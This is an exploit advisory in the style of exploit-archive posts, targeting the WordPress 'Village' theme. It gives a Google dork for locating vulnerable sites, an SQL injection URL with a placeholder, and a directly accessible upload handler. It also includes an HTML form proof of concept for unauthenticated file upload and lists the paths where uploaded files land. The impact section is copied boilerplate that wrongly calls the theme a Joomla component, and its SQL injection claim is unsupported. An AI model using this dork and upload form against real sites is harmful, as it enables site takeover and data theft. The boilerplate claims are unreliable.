####################################################################

# Exploit Title : WordPress Village Themes 5.0 CSRF / Backdoor Access / SQL Injection Vulnerability
# Author [ Discovered By ] : KingSkrupellos
# Team : Cyberizm Digital Security Army
# Date : 20/02/2019
# Vendor Homepage : themeforest.net/user/themeprovince/portfolio
# Software Information Link : themeforest.net/item/village-a-responsive-fullscreen-wordpress-theme/237812
# Software Version :	WordPress 4.2, WordPress 4.1, WordPress 4.0 and 5.0 
+ Compatible with WPML, WooCommerce 2.2.x 
# Software Price : 59$
# Tested On : Windows and Linux
# Category : WebApps
# Exploit Risk : Low / Medium
# Google Dorks : inurl:''/wp-content/themes/village/''
# Vulnerability Type : CWE-89 [ Improper Neutralization of 
Special Elements used in an SQL Command ('SQL Injection') ]
CWE-352 [ Cross-Site Request Forgery (CSRF) ]
CWE-264 [ Permissions, Privileges, and Access Controls ]
CWE-434 [ Unrestricted Upload of File with Dangerous Type ]
# PacketStormSecurity : packetstormsecurity.com/files/authors/13968
# CXSecurity : cxsecurity.com/author/KingSkrupellos/1/
# Exploit4Arab : exploit4arab.org/author/351/KingSkrupellos

####################################################################

# Description about Software :
***************************
Village has an awesome gallery manager that allows you to upload 100s of photos 

in just a few clicks. Gallery thumbnails can be portrait or landscape.

Village allows you to display awesome jQuery walls with ease.

With Village you can assign a different background or slideshow to each post/page/portfolio.

####################################################################

# Impact :
***********
* WordPress Village Themes 5.0 and other versions - 

component for Joomla is prone to an SQL-injection vulnerability because it 

fails to sufficiently sanitize user-supplied data before using it in an SQL query. 

Exploiting this issue could allow an attacker to compromise the application, 

access or modify data, or exploit latent vulnerabilities in the underlying database.

A remote attacker can send a specially crafted request to the vulnerable application 

and execute arbitrary SQL commands in application`s database.

Further exploitation of this vulnerability may result in unauthorized data manipulation.

An attacker can exploit this issue using a browser.

* This software is prone to a cross-site request-forgery 

vulnerability due to insufficient CSRF protection. 

An attacker can exploit this issue to perform certain unauthorized actions 

and gain access to the affected application. Other attacks are also possible. 

The web application does not, or can not, sufficiently verify whether a 

well-formed, valid, consistent request was intentionally provided by the user 

who submitted the request.

* The software allows the attacker to upload or transfer files of 

dangerous types that can be automatically processed within the product's environment.

* Weaknesses in this category are related to the management of permissions, privileges, 

and other security features that are used to perform access control.

####################################################################

# SQL Injection Exploit => 
***********************
/wp-content/themes/village/index.php?id=[SQL Injection]

# Direct Access Exploit => 
***********************
/wp-content/themes/village/blueprint/gallery/ajaxupload/server/php.php

Vulnerability Error =>
********************
{"error":"No files were uploaded."}

# CSRF File Upload Exploit Proof of Concept  => 
******************************************
<form enctype="multipart/form-data"
action="VULNERABLESITEHERE/wp-content/themes/village/blueprint/gallery/ajaxupload/server/php.php" method="post">
Your File: <input name="qqfile" type="file" /><br />
<input type="submit" value="upload" />
</form>

# Directory File Paths :
*******************
Search your files here in this folder.

/wp-content/themes/village/blueprint/......

/wp-content/themes/village/......

/wp-content/uploads/[YEAR]/[MONTH]/.....

/wp-content/uploads/......

####################################################################

# Discovered By KingSkrupellos from Cyberizm.Org Digital Security Team 

####################################################################
